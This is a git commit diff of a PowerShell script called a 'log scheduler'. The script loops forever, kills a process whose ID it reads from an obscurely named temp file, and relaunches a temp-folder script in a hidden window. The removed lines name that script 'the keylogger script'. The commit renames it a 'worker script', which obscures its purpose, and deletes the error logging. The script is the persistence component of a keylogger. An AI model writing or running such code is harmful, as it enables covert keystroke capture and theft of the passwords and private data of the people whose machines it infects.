1b4d763cb5dc2242b58157ffa3a8ed56682c696c
whispiqx <xterm8899@gmail.com>
2025-06-14 20:23:11 +0100

    Update l.ps1

--- l.ps1
+++ l.ps1
@@ -1,28 +1,15 @@
 # powershell log scheduler
-# created by : C0SM0
+# created by: C0SM0
 
 for(;;) {
     try {
-        # Read the process ID from the file
-        $procFile = "$env:temp/DdBPKCytRe"
-        if (Test-Path $procFile) {
-            $proc = Get-Content $procFile
-            if (Get-Process -Id $proc -ErrorAction SilentlyContinue) {
-                Stop-Process -Id $proc -Force
-                Write-Host "Stopped process ID: $proc"
-            } else {
-                Write-Host "Process ID $proc not found."
-            }
-        } else {
-            Write-Host "Process ID file not found."
-        }
-
-        # Start the keylogger script
-        Start-Process powershell.exe -WindowStyle Hidden "$env:temp/p.ps1"
+        # invoke the worker script
+        $proc = Get-Content "$env:TEMP\DdBPKCytRe"
+        Stop-Process -Id $proc -Force
+        powershell Start-Process powershell.exe -WindowStyle Hidden "$env:TEMP\p.ps1"
     }
     catch {
-        # Log the error for debugging
-        Add-Content -Path "$env:TEMP\error_log.txt" -Value "Error in Scheduler: $_"
+        # do something with $_, log it, more likely
     }
    
     # wait for a minute
